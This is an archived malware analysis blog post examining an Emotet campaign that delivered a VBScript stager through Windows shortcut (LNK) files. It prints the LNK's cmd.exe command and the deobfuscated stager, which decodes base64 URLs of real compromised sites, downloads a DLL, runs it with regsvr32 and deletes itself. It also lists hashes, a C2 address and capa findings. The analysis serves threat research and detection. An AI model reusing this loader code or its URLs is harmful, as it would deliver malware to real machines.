{
    "id": "de8bcf5d-9075-44ee-a792-1f581084bd57",
    "created_at": "2023-01-12T15:07:46.469172Z",
    "updated_at": "2025-03-27T02:05:35.184905Z",
    "deleted_at": null,
    "sha1_hash": "38b4de6831871975ed488310f3024f5413e1fe14",
    "title": "2022-04-24 - Shortcut to Emotet, an odd TTP change",
    "authors": "",
    "file_creation_date": "2022-05-28T05:07:20Z",
    "file_modification_date": "2022-05-28T05:07:20Z",
    "file_size": 147238,
    "plain_text": "# Shortcut to Emotet, an odd TTP change\n\n**forensicitguy.github.io/shortcut-to-emotet-ttp-change/**\n\n### By Tony Lambert Posted 2022-04-24 11 min read\n\n\nApril 24, 2022\n\n\n### The adversary behind Emotet made a really interesting TTP change around 4/22 to use Windows shortcut files, and it definitely got noticed by multiple researchers.\n\n #Emotet New TTPs üö®\n\n [+] LNK with embedded VBScript\n\n [+] VBS stager:\n\n - Base64 encoded URLs X7\n - ServerXMLHTTP download Emotet > %TMP%\n\n - Exec with regsvr32\n\n - VBS file removed after the exec\n\n LNK > CMD > findstr & Wscript > Regsvr32 > Regsvr32\n\n C2 server: 138.201.142[.]73:8080üî• https://t.co/DHGHAMiAPX pic.twitter.com/0ans5nyI79\n\n ‚Äî Max_Malyutin (@Max_Mal_) April 23, 2022\n\n 2022-04-22 (Friday) - #Emotet #epoch4 malspam sent zipped Windows shorcut (.LNK). LNK didn't work in my lab or online sandboxes. But the shortcut contains script that I copied into a .vbs file, which ran fine. LNK: https://t.co/zfiDZytclb VBS: https://t.co/PMKUrA7RIn pic.twitter.com/XiNbazHeY1\n\n ‚Äî Brad (@malware_traffic) April 22, 2022\n\n This TTP change is a bit odd but not entirely unexpected with Emotet. Since returning earlier in the year, the adversary behind Emotet has spent a significant amount of time experimenting with different deployment techniques until settling on Excel 4.0 macros. Previous iterations also explored APPX packages, experiments with PowerShell, and more. There‚Äôs no way to know if this TTP change will stay as part of Emotet‚Äôs rotation, but if it does it will help to understand how it works. In this post I want to walk through the latest change using the sample available in MalwareBazaar here: https://bazaar.abuse.ch/sample/082d5935271abf58419fb5e9de83996bd2f840152de595afa7 d08e4b98b1d203/.\n\n\n-----\n\n## Triaging the shortcut\n\n### We can easily get the first few details from the shortcut using a combination of diec,\n```\nfile, and exiftool . First, let‚Äôs confirm the shortcut is indeed a shortcut.\n  remnux@remnux:~/cases/emotet$ file INV\\ 2022-04-22_1538\\,\\ US.doc.lnk \n  INV 2022-04-22_1538, US.doc.lnk: MS Windows shortcut, Item id list present, Has\n  Relative path, Has command line arguments, Icon number=134, ctime=Mon Jan 1\n  04:56:02 1601, mtime=Mon Jan 1 04:56:02 1601, atime=Mon Jan 1 04:56:02 1601,\n  length=0, window=hide\n  remnux@remnux:~/cases/emotet$ diec INV\\ 2022-04-22_1538\\,\\ US.doc.lnk \n  Binary\n    Format: Windows Shortcut (.LNK)\n\n It looks like both file and diec agree that we‚Äôre looking at a MS Windows LNK shortcut file. Now let‚Äôs parse that metadata using exiftool .\n\n```\n\n-----\n\n```\nremnux@remnux:~/cases/emotet$ exiftool INV\\ 2022-04-22_1538\\,\\ US.doc.lnk \nExifTool Version Number     : 12.30\nFile Name            : INV 2022-04-22_1538, US.doc.lnk\nDirectory            : .\nFile Size            : 3.6 KiB\nFile Modification Date/Time   : 2022:04:22 22:17:34-04:00\nFile Access Date/Time      : 2022:04:24 19:58:22-04:00\nFile Inode Change Date/Time   : 2022:04:24 19:56:34-04:00\nFile Permissions        : -rw-r--r-File Type            : LNK\nFile Type Extension       : lnk\nMIME Type            : application/octet-stream\nFlags              : IDList, RelativePath, CommandArgs, IconFile,\nUnicode\nFile Attributes         : (none)\nTarget File Size        : 0\nIcon Index           : 134\nRun Window           : Normal\nHot Key             : (none)\nTarget File DOS Name      : cmd.exe\nRelative Path          : ..\\..\\Windows\\system32\\cmd.exe\nCommand Line Arguments     : /v:on /c findstr \"rSIPPswjwCtKoZy.*\"\nPassword2.doc.lnk > \"%tmp%\\VEuIqlISMa.vbs\" & \"%tmp%\\VEuIqlISMa.vbs\"\nIcon File Name         : shell32.dll\n\n```\n\n-----\n\n### Looking at the metadata, we can piece together the command it ll execute by piecing together the Target File DOS Name and Command Line Arguments. Put together, it‚Äôll spawn this command:\n```\n  C:\\Windows\\system32\\cmd.exe /v:on /c findstr \"rSIPPswjwCtKoZy.*\"\n  Password2.doc.lnk > \"%tmp%\\VEuIqlISMa.vbs\" & \"%tmp%\\VEuIqlISMa.vbs\"\n\n That cmd.exe command will spawn from explorer.exe once the user clicks on the shortcut, execute a findstr to search a Password2.doc.lnk for a line that includes\nrSIPPswjwCtKoZy, writes that line of code to VEuIqlISMa.vbs, and then executes\nVEuIqlISMa.vbs .\n\n NOTE: As the LNK file is currently not named Password2.doc.lnk, the stage will not work. We‚Äôre going to continue analysis here under the assumption the adversary had gotten the naming to work properly.\n\n## Analyzing the VBS\n\n### We can manually get the VBS file ourselves using a grep command in REMnux.\n  remnux@remnux:~/cases/emotet$ grep -aF \"rSIPPswjwCtKoZy\" INV\\ 2022-04-22_1538\\,\\\n  US.doc.lnk > VEuIqlISMa.vbs\n  remnux@remnux:~/cases/emotet$ file VEuIqlISMa.vbs \n  VEuIqlISMa.vbs: ASCII text, with very long lines\n  remnux@remnux:~/cases/emotet$ diec VEuIqlISMa.vbs \n  Binary\n    Format: plain text[LF]\n\n We successfully exported the VBS! It‚Äôs all on one line initially, but once we clean it up we can get some findings. The first half of the script is below, and it contains some overhead code and the URLs needed for downloading code.\n\n```\n\n-----\n\n```\nrSIPPswjwCtKoZy=1::\non error resume next:\nSet FSO = CreateObject(\"Scripting.FileSystemObject\")::\nFunction Base64Decode(ByVal vCode):  \nWith CreateObject(\"Msxml2.DOMDocument.3.0\").CreateElement(\"base64\"):    \n  .dataType = \"bin.base64\":    \n  .text = vCode:    \n  Base64Decode = Stream_BinaryToString(.nodeTypedValue):  \nEnd With:\nEnd Function::\nFunction Stream_BinaryToString(Binary):  \nWith CreateObject(\"ADODB.Stream\"):    \n  .Type = 1:    \n  .Open:    \n  .Write \n  Binary:    \n  .Position = 0:    \n  .Type = 2:    \n  .CharSet = \"utf-8\":    \n  Stream_BinaryToString = .ReadText:  \nEnd With:\nEnd Function::\nDim JOCItJMMrs(7):::\nJOCItJMMrs(0) = \"aHR0cDovL2Z0cC5jaXBsYWZlLmNvbS5ici9BTFQvM3dkQllKZXBSVi8=\"::\n' hxxp://ftp.ciplafe.com[.]br/ALT/3wdBYJepRV/\nJOCItJMMrs(1) =\n\"aHR0cHM6Ly9iZW5jZXZlbmRlZ2hhei5odS93cC1pbmNsdWRlcy85MHZsc1lXNUpJalov\"::\n' hxxps://bencevendeghaz[.]hu/wp-includes/90vlsYW5JIjZ/\nJOCItJMMrs(2) = \"aHR0cDovL2V6bmV0Yi5zeW5vbG9neS5tZS9AZWFEaXIvd2cyQnFhV0ZSWmIxRy8=\"::\n' hxxp://eznetb.synology[.]me/@eaDir/wg2BqaWFRZb1G/\nJOCItJMMrs(3) =\n\"aHR0cHM6Ly93d3cucmVuZWV0dGVuLm5sL2NvbnRhY3QtZm9ybXVsaWVyL3R2ekFUbkltRk1OZjIwcmM3Lw=\n=\"::\n' hxxps://www.reneetten[.]nl/contact-formulier/tvzATnImFMNf20rc7/\nJOCItJMMrs(4) = \"aHR0cDovL2Rhcmtzd29yZC5ubC9hd3N0YXRzL1pxVm5VNW9sLw==\"::\n' hxxp://darksword[.]nl/awstats/ZqVnU5ol/\nJOCItJMMrs(5) =\n\"aHR0cDovL2RhY2VudGVjMi5sYXllcmVkc2VydmVyLmNvbS9zcGVlZHRlc3QvV2RKelFSRTlHaHZzLw==\"::\n' hxxp://dacentec2.layeredserver[.]com/speedtest/WdJzQRE9Ghvs/\nJOCItJMMrs(6) =\n\"aHR0cDovL3ZpcC1jbGluaWMucmF6cmFib3RrYS5ieS9hYm91dF9jZW50ZXIvTE10QlRjTEgwcEgxb1BoaTk\nv\":::\n' hxxp://vip-clinic.razrabotka[.]by/about_center/LMtBTcLH0pH1oPhi9/\n\n```\n\n-----\n\n-----\n\n### The first two functions are overhead/utility functions to perform encoding conversions. The chunk of code manipulating JOCItJMMrs(7) creates an array that contains all the Emotet download URLs. These URLs are base64 encoded and you can readily decode them using CyberChef or base64 -d commands in REMnux. The second half of the script contains some obfuscation in the form of string splitting and character to decimal conversion. Once we get that reduced, it‚Äôll look something like this:\n```\n  Execute(\n    \"Dim Xml,WS,DB,FilepatH,URL:\n    Xml = MSXML2.SErverXmlHtTP.3.0:\n    WS = \"\"WsCript.SHELl:\n    dB = \"\"adoDb.strEAM\"\":\n    Set SblpfvbXdq = CREATEOBJECT(WS):\n    tMP = sblpfvBXDQ.EXpAnDEnvironmentStRIngS(\"\"%TmP%\"\"):\n    WIndiR = SbLPFvBxdQ.expandenviroNmEntstRINgs(\"\"%WINdir%\"\") ::\n    filEpaTH = Tmp & \"\"\\VMtbfGSBow.QsJ\"\":::\n    cAll prog:\n    SUb prog:\n      RANDoMIzE:\n      indeX = int((6 - 0 + 1)*Rnd + 0):\n      dIm MsxMl:\n    Set MsXmL = crEAteoBJEct(Xml):\n      diM sTreaM:\n    seT STReaM = CrEATEObjEct(dB):\n      MsXmL.opeN gEt, Base64DecOde(JocITjmMrS(iNDex)), fALSE:\n      MsXmL.setreqUEsthEaDER USer-agEnT, kykwTJBDAyBKqLonrjjG:\n      MsXMl.senD:\n      wIth stReAm:\n        .tyPe = 1:\n        .open:\n      .WRite MsXMl.resPONseboDy:\n      .saVetofilE FilEPath, 2:\n      end wiTh:\n    EnD SUB\")::\n  SBLpFvbXDQ.Exec(windir & \"\\System32\\regsvR32.ExE \" & tmp &\n  Base64Decode(\"XHZtVGJmR1NCT1cucXNq\")):\n  ' \\vmTbfGSBOW.qsj\n  FSO.GetFile(WScript.ScriptFullName).delete\n\n```\n\n-----\n\n### This chunk of code takes VBScript pass into Execute() as a string and executes it. That code randomly picks an element of the JocITjmMrS(7) array, attempts to download content (presumably a DLL) from that URL to vmTbfGSBOW.qsj, and executes the downloaded content with regsvr32.exe . Afterward, the script deletes itself from disk. One very odd detail in this script is that the adversary chooses to specify a User-Agent string of\n```\nkykwTJBDAyBKqLonrjjG . This may be something designed to gate access or keep track of\n\n statistics since UA strings can be arbitrary and optional.\n\n To summarize so far:\n   explorer.exe spawns cmd.exe with the findstr command to write the VBS\n   cmd.exe spawns wscript.exe VEuIqlISMa.vbs\n   wscript.exe contacts one of 7 URLs to download a DLL\n\n```\n\n-----\n\n```\n   wscript.exe writes the DLL to vmTbfGSBOW.qsj\n   wscript.exe executes regsvr32.exe vmTbfGSBOW.qsj\n   wscript.exe removes VEuIqlISMa.vbs from disk\n\n## Triage the downloaded DLL\n\n### From here the threat converges to a traditional Emotet infection via DLL. Before I stop for the evening I still want to triage the DLL a bit and see if we can generate some hypotheses.\n  remnux@remnux:~/cases/emotet$ file vmTbfGSBOW.qsj \n  vmTbfGSBOW.qsj: PE32+ executable (DLL) (GUI) x86-64, for MS\n  Windows\n  remnux@remnux:~/cases/emotet$ diec vmTbfGSBOW.qsj \n  PE64\n    Library: MFC(-)[static]\n    Compiler: Microsoft Visual C++(2005)[-]\n    Linker: Microsoft Linker(8.0 or 11.0)[DLL64]\n\n It looks like the file is a 64-bit Windows DLL. Let‚Äôs get those hashes:\n  remnux@remnux:~/cases/emotet$ pehash vmTbfGSBOW.qsj \n  file\n    filepath:            vmTbfGSBOW.qsj\n    md5:               87531dab200c392f33d0d9c18abf53c0\n    sha1:              82412da65a6638050344b87784c8a7ec4468fe58\n    sha256:             \n  3c9b05b81bf7f6e7864527c03f5ed8c87c9c7ebab58a58d1766fd439f2740ce8\n    ssdeep:             \n  12288:C1FIcocJwMTHzXO7N2OBHiyzskF1CubVnmn:tco9MTHzXO7N7/115mn\n    imphash:             6ba79cbed2acbe9b8ecc8e14a572f100\n\n```\n\n-----\n\n### I also like to get rich header hashes for pivoting with VT Enterprise/Intelligence, and you can do the same using Python and the pefile library.\n```\n  import pefile\n  binary =\n  pefile.PE('vmTbfGSBOW.qsj')\n  binary.get_rich_header_hash()\n  'e47802314222a55b74fe99a752e0b6\n  58'\n\n With the imphash we can pivot in VT to find files with similar capabilities, with the rich header hash we can pivot in VT to find files with similar build environments. The final thing I want to do tonight is get an idea of the DLL‚Äôs capabilities using capa .\n  remnux@remnux:~/cases/emotet$ capa vmTbfGSBOW.qsj \n  +------------------------+------------------------------------------------------  -----------------------------+\n  | md5          | 87531dab200c392f33d0d9c18abf53c0           \n  |\n  | sha1          | 82412da65a6638050344b87784c8a7ec4468fe58       \n  |\n  | sha256         |\n  3c9b05b81bf7f6e7864527c03f5ed8c87c9c7ebab58a58d1766fd439f2740ce8         \n  |\n  | path          | vmTbfGSBOW.qsj                    \n  |\n  +------------------------+------------------------------------------------------  -----------------------------+\n  +------------------------+------------------------------------------------------  -----------------------------+\n  | ATT&CK Tactic     | ATT&CK Technique                   \n  |\n  |------------------------+------------------------------------------------------  -----------------------------|\n  | COLLECTION       | Input Capture::Keylogging T1056.001          \n  |\n  | DEFENSE EVASION    | Modify Registry:: T1112                \n  |\n  |            | Obfuscated Files or Information::Indicator Removal\n  from Tools T1027.005      |\n  | EXECUTION       | Shared Modules:: T1129                \n  |\n\n```\n\n-----\n\n```\n-----------------------------+\n+-----------------------------+------------------------------------------------------------------------------+\n| MBC Objective        | MBC Behavior                   \n|\n|-----------------------------+------------------------------------------------------------------------------|\n| ANTI-STATIC ANALYSIS    | Disassembler Evasion::Argument Obfuscation\n[B0012.001]            |\n| COLLECTION         | Keylogging::Polling [F0002.002]         \n|\n| DISCOVERY          | Application Window Discovery::Window Text\n[E1010.m01]             |\n| MEMORY           | Allocate Memory:: [C0007]            \n|\n| OPERATING SYSTEM      | Registry::Create Registry Key [C0036.004]    \n|\n|               | Registry::Delete Registry Key [C0036.002]    \n|\n|               | Registry::Open Registry Key [C0036.003]     \n|\n+-----------------------------+------------------------------------------------------------------------------+\n+------------------------------------------------------+-----------------------------------------------------+\n| CAPABILITY                      | NAMESPACE        \n|\n|------------------------------------------------------+-----------------------------------------------------|\n| contain obfuscated stackstrings           | antianalysis/obfuscation/string/stackstring     |\n| log keystrokes via polling              | collection/keylog    \n|\n| contain a resource (.rsrc) section          |\nexecutable/pe/section/rsrc              |\n| extract resource via kernel32 functions (3 matches) | executable/resource   \n|\n| get graphical window text              | hostinteraction/gui/window/get-text         |\n| allocate RWX memory                 | hostinteraction/process/inject           |\n| create or open registry key             | hostinteraction/registry              |\n| delete registry key                 | hostinteraction/registry/delete           |\n| link function at runtime (4 matches)         | linking/runtime-linking \n|\n| link many functions at runtime            | linking/runtime-linking \n|\n| parse PE exports                   | load-code/pe      \n|\n| parse PE header (6 matches)             | load-code/pe      \n|\n+------------------------------------------------------+-----------------------------------------------------+\n\n```\n\n-----\n\n### There are a decent number of capabilities listed but I want to zoom in on a few that may make further static analysis difficult:\n\n contains obfuscated stackstrings link functions at runtime parse PE header/exports\n\n The obfuscated stackstrings will slow static analysis a bit while the analyst figures out what the strings are supposed to say. The function linking at runtime means that we can‚Äôt easily catalog all the capabilities of the DLL using its import table. Once it starts using something like LoadLibrary and GetProcAddress to manually resolve other imports the sample will get more complicated quickly. Finally, PE header and export parsing isn‚Äôt always a sign of more difficulties, but it can indicate the sample is designed to unpack a second PE and write it into memory for execution. From here the best path for me will be dynamic analysis in a sandbox for further analysis.\n\n\n-----\n\n## Why a LNK shortcut?\n\n### Before winding down for the night, I want to address one question: ‚ÄúWhy would an adversary use LNK files?‚Äù\n\n Shortcut files present an interesting opportunity compared to other deployment options. Consider MS Office files and the macros therein. As more adversaries have used macros, Microsoft has clamped down and allowed more security controls around macros to make them less useful to adversaries. As more organizations adopt controls to limit macros, adversaries become less effective. Consider script files like VBS, JS, and MSHTA files. Organizations can mitigate against adversaries using these files by disabling their default file handler associations or replacing it with Notepad. Such a change won‚Äôt significantly hinder IT operations in most organizations, and it keeps users from double-clicking to execute malware.\n\n Shortcut files are specifically designed to be double-clicked for execution. You can‚Äôt really block them easily because doing so would significantly interfere with normal desktop and start menu shortcuts. You can easily change their icons to show whatever image you want, you can specify whatever commands in their metadata you want, and you can easily append data to a shortcut without interfering with its operation. This is a ready-made set of circumstances that allow easy exploitation. Many other adversaries have also explored using LNK files to great effect, including adversaries deploying IcedID and Bumblebee malware.\n\n Thanks for reading!\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2022/2022-04-24 - Shortcut to Emotet, an odd TTP change.pdf"
    ],
    "report_names": [
        "2022-04-24 - Shortcut to Emotet, an odd TTP change.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673536066,
    "ts_updated_at": 1743041135,
    "ts_creation_date": 1653714440,
    "ts_modification_date": 1653714440,
    "files": {
        "pdf": "https://archive.orkl.eu/38b4de6831871975ed488310f3024f5413e1fe14.pdf",
        "text": "https://archive.orkl.eu/38b4de6831871975ed488310f3024f5413e1fe14.txt",
        "img": "https://archive.orkl.eu/38b4de6831871975ed488310f3024f5413e1fe14.jpg"
    }
}